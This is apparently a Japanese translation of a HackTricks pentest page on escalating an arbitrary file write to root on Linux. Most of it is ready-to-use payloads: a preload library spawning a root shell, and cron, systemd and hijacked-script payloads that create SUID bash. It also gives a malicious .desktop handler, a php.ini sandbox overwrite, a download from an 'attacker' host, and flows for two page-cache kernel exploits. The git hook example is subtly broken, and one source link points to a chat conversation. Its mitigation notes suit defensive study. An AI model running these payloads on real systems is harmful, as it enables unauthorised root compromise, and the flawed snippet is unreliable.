# Rootへの任意ファイル書き込み

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

このファイルは **`LD_PRELOAD`** env variable と同様に動作しますが、**SUID binaries** でも機能します。\
これを作成または変更できる場合、実行される各 binary とともに **ロードされる library の path** を追加するだけで済みます。

例: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) は、commit の作成や merge など、git repository におけるさまざまな **events** で **実行**される **scripts** です。そのため、**privileged script または user** がこれらの操作を頻繁に実行しており、**`.git` folder に write** できる場合、これを **privesc** に利用できます。

例えば、git repo の **`.git/hooks`** に **script を生成**し、新しい commit が作成されたときに常に実行されるようにできます:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Time files

**root** が実行する cron 関連ファイルに**書き込み**できる場合、通常はジョブが次回実行された際に code execution を取得できます。対象として興味深いものは次のとおりです。

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`、`/etc/cron.daily/*`、`/etc/cron.weekly/*`、`/etc/cron.monthly/*`
- `/var/spool/cron/` または `/var/spool/cron/crontabs/` にある root 自身の crontab
- `systemd` timers と、それらが起動する services

Quick checks:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
よくある悪用経路：

- `/etc/crontab` または `/etc/cron.d/` 内のファイルに **新しい root cron job を追加**
- `run-parts` によってすでに実行されている **script を置き換え**
- 起動する script または binary を変更して、**既存の timer target に backdoor を仕込む**

最小限の cron payload の例：
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
`run-parts` が使用する cron ディレクトリ内にしか書き込めない場合は、代わりにそこへ実行可能ファイルを配置します:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Notes:

- `run-parts` は通常、ドットを含むファイル名を無視するため、`backup.sh` ではなく `backup` のような名前を優先します。
- 一部の distro では従来の cron の代わりに `anacron` や `systemd` timers を使用しますが、abuse の考え方は同じです。つまり、**後で root が実行するものを変更する**ということです。

### Service & Socket files

**`systemd` unit files** またはそれらが参照するファイルに書き込める場合、unit を reload して restart するか、service/socket activation の経路が trigger されるのを待つことで、root として code execution を得られる可能性があります。

Interesting targets には、次のものがあります。

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- `/etc/systemd/system/<unit>.d/*.conf` 内の drop-in overrides
- `ExecStart=`, `ExecStartPre=`, `ExecStartPost=` で参照される service scripts/binaries
- root service が読み込む、書き込み可能な `EnvironmentFile=` paths

Quick checks:
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
一般的な悪用経路:

- **変更可能な root-owned service unit の `ExecStart=` を上書きする**
- **悪意のある `ExecStart=` を含む drop-in override を追加し、最初に古い設定をクリアする**
- **unit がすでに参照している script/binary に backdoor を仕込む**
- **socket が connection を受信したときに起動する、対応する `.service` file を変更して socket-activated service を hijack する**

悪意のある override の例:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
一般的なアクティベーションフロー:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
自分で services を restart できなくても、socket-activated unit を編集できる場合は、**client connection を待つだけ**で、backdoor 化された service を root として実行させられる可能性があります。

### 特権 PHP sandbox で使用される制限付き `php.ini` を上書きする

一部の custom daemon は、**制限された `php.ini`**（例: `disable_functions=exec,system,...`）を指定して `php` を実行することで、user が提供した PHP を検証します。sandbox 内の code に **何らかの write primitive**（`file_put_contents` など）が残っており、さらに daemon が使用する **正確な `php.ini` の path** にアクセスできる場合、その config を **上書きして**制限を解除し、その後、昇格された privileges で実行される second payload を送信できます。<sup>[[2]](#references)</sup>

典型的な flow:

1. 最初の payload で sandbox config を上書きする。
2. 危険な functions が再び有効になった状態で、second payload が code を実行する。

最小限の例（daemon が使用する path に置き換えてください）:
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
デーモンが root として実行される場合（または root 所有のパスで検証を行う場合）、2 回目の実行によって root context が得られます。これは、sandboxed runtime が引き続きファイルを書き込める場合における、**config overwrite による privilege escalation** です。

### binfmt_misc

`/proc/sys/fs/binfmt_misc` にあるファイルは、どの種類のファイルをどの binary で実行するかを示します。TODO: 一般的なファイル形式が開かれたときに rev shell を実行するためにこれを悪用する要件を確認する。

### schema handler（http: や https: など）の Overwrite

被害者の configuration directory への write permissions を持つ attacker は、system behavior を変更するファイルを簡単に置き換えたり作成したりでき、その結果、意図しない code execution が発生します。`$HOME/.config/mimeapps.list` ファイルを変更して、HTTP および HTTPS URL handler を malicious file（例: `x-scheme-handler/http=evil.desktop` を設定）に指定すると、**任意の http または https link をクリックした際に、その `evil.desktop` ファイルで指定された code が実行されます**。たとえば、`$HOME/.local/share/applications` 内の `evil.desktop` に次の malicious code を配置すると、外部 URL をクリックするたびに埋め込まれた command が実行されます。
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
詳細については、実際の脆弱性の exploit に使用された[**この投稿**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49)を確認してください。

### Root が実行する user-writable な scripts/binaries

特権ワークフローが `/bin/sh /home/username/.../script` のようなもの（または unprivileged user が所有するディレクトリ内の任意の binary）を実行する場合、それを hijack できます:<sup>[[1]](#references)</sup>

- **実行を検出する:** [pspy](https://github.com/DominicBreuker/pspy) でプロセスを監視し、root が user-controlled な path を呼び出していることを検出します：
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **書き込み可能であることを確認:** 対象ファイルとそのディレクトリの両方が、自分のユーザーに所有されているか、書き込み可能であることを確認します。
- **対象を乗っ取る:** 元の binary/script をバックアップし、SUID shell（またはその他の root action）を作成する payload を配置してから、権限を復元します。
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **privileged actionをtriggerする**（例：helperをspawnするUI buttonを押す）。rootがhijackされたpathを再実行したら、`./rootshell -p`でescalated shellを取得する。

### privileged binariesのpage-cache-only file modification

一部のkernel bugは、fileを**disk上で**modifyしません。代わりに、readable fileの**page cache copy**だけをmodifyできるようにします。**setuid**またはその他の方法で**rootによって実行される**binaryをtargetにできれば、disk上のfile hashが変更されていなくても、次のexecutionでmemory上のattacker-controlled bytesが実行され、privilegesをescalateできる可能性があります。

これは**runtime-only file write primitive**として考えると便利です：

- **Disk stays clean**：inodeとdisk上のbytesは変更されない
- **Memory is dirty**：cached pageをread/executeするprocessは、attackerがmodifyしたcontentを取得する
- **Effect is temporary**：rebootまたはcache eviction後に変更は消える

このprimitiveは、classicな**arbitrary file write**と、Dirty COW / Dirty Pipeなどの古い**page-cache abuse** bugの中間に位置します：

- Dirty COWはraceに依存していた
- Dirty Pipeにはwrite-positionの制約があった
- page-cache-only primitiveは、vulnerable pathがcached file-backed pagesへのdirect writeを提供する場合、よりreliableになる可能性がある

#### Generic privesc flow

1. **file-backed page cache pages**へwriteできるkernel primitiveを取得する
2. **readable privileged binary**またはその他のroot-executed fileに対して使用する
3. pageがcacheからevictされる**前に**executionをtriggerする
4. on-disk fileが変更されていない状態で、rootとしてcode executionを取得する

Typical high-value targets：

- **setuid-root** binaries
- **root services**によってlaunchされるhelpers
- **host kernel/page cacheを共有するcontainers**からcommonにexecuteされるbinaries

#### AF_ALG + `splice()` example path

Copy Fail (CVE-2026-31431)は、このclassの良いexampleです。vulnerable pathはLinux crypto userspace API（`AF_ALG` / `algif_aead`）にありました：<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()`は、readable fileからpage-cache pagesへのreferencesをcrypto TX scatterlistへ移動できる
- in-placeの`algif_aead` decrypt pathはsourceとdestination buffersを再利用した
- `authencesn`はその後、destination tag regionへwriteした
- そのregionがまだspliced file-backed pagesをreferenceしていた場合、writeは**target fileのpage cache**に書き込まれた

したがって、興味深いtechniqueはCVE自体ではなく、次のpatternです：

- **file-backed cache pagesをkernel subsystemへfeedする**
- subsystemにそれらを**writable outputとして扱わせる**
- memory上でsmall controlled overwriteをtriggerする

Public PoCは、repeatedな**4-byte writes**を使用して`/usr/bin/su`をmemory上でpatchし、その後executeしました。

#### ESP / XFRM + netfilter TEE clone example path

DirtyClone (CVE-2026-43503)は、同じ**page-cache-only write-to-root** patternの別variantを示しています。ただし今回は、sinkは`AF_ALG`ではなく**IPsec ESP decrypt**です。<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

重要なtechniqueは、**metadata-laundering step**です：

- `splice()`は**read-only file-backed page-cache page**をESP-in-UDP packetへ配置する
- original DirtyFrag mitigationは、そのskbに`SKBFL_SHARED_FRAG`をtag付けし、`esp_input()`が**decrypt前にcopy**するようにしていた
- netfilter `TEE`は、`nf_dup_ipv4()` -> `__pskb_copy_fclone()`を通じてpacketをduplicateする
- cloneは**同じphysical page-cache reference**を保持するが、`SKBFL_SHARED_FRAG`を失う
- その後`esp_input()`はcloneをsafeだと判断し、file-backed page上でin-placeの`cbc(aes)` decryptを実行する

したがって、reviewerにとってのlessonはCVEよりも広いものです：operationで先にcopyが必要かどうかを判断するために**skb/page metadata**に依存するmitigationでは、backing pageを保持しながらmetadataをdropする**clone/copy path**によって、write primitiveが気付かないうちに再び有効化される可能性があります。

Typical exploitation flow：

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)`を使用して、private network namespace内で**`CAP_NET_ADMIN`**を取得する
2. loopbackをupにし、`mangle/OUTPUT`へnetfilterの**`TEE` rule**をinstallする
3. `NETLINK_XFRM`経由で**XFRM ESP transport SAs**をinstallする
4. 各target 4-byte wordをSAの`seq_hi` fieldにencodeする（DirtyFragのword-selection trick）
5. spliced ESP-in-UDP packetをsendし、**TEE clone**が`esp_input()`に到達してin-place decryptするようにする
6. page-cache copy of `/usr/bin/su`またはその他のprivileged executableにattacker-controlled codeが含まれるまでrepeatする

Operationally、impactは`AF_ALG` exampleと同じです：disk上のfileはcleanなままですが、`execve()`は**mutated page-cache bytes**をconsumeし、rootを取得できます。

このvariantで役立つexposure checks：
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
ここでの短期的な attack-surface の削減も path-specific です。`48f6a5356a33` を含む kernel にアップグレードすると clone path が修正され、`xt_TEE` の autoload をブロックすると **flag-laundering step** が削除され、`esp4` / `esp6` をブロックすると **decrypt sink** が削除されます。

#### Exposure and hunting

この種類の bug が疑われる場合、disk integrity checks だけに頼らないでください。以下も確認します。
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` は module として load/unload 可能
- `CONFIG_CRYPTO_USER_API_AEAD=y`: interface は kernel に組み込まれている
- setuid binaries は優れた target です。page-cache-only patch だけで、local foothold を root に昇格できる場合があるためです

#### `algif_aead` path の attack-surface reduction

vulnerable interface が loadable module によって提供されている場合：
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
カーネルにコンパイルされている場合、いくつかの disclosure では init path がブロックされたと報告されています：
```bash
initcall_blacklist=algif_aead_init
```
この種の緩和策は、他の kernel LPE についても覚えておく価値があります。exploit が特定の optional interface に依存している場合、その interface を無効化または blacklist 化することで、kernel の完全な upgrade が利用可能になる前でも exploit path を断つことができます。

## References

- [1] [HTB Bamboo – user-writable な PaperCut directory 内の root-executed script の hijacking](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Openwall oss-security による CVE-2026-31431 の disclosure](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Linux stable fix: crypto: algif_aead - out-of-place で動作するように revert](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — CVE-2026-31431 advisory](https://copy.fail/)
- [7] [Theori / Xint technical writeup](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [DirtyClone repository / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Linux LPE variant DirtyClone (CVE-2026-43503) の dissecting and exploiting](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Linux fix: net: skb: `__pskb_copy_fclone()` で `SKBFL_SHARED_FRAG` を preserve (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Linux earlier mitigation: spliced UDP packets に `SKBFL_SHARED_FRAG` を set (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)

{{#include ../../banners/hacktricks-training.md}}
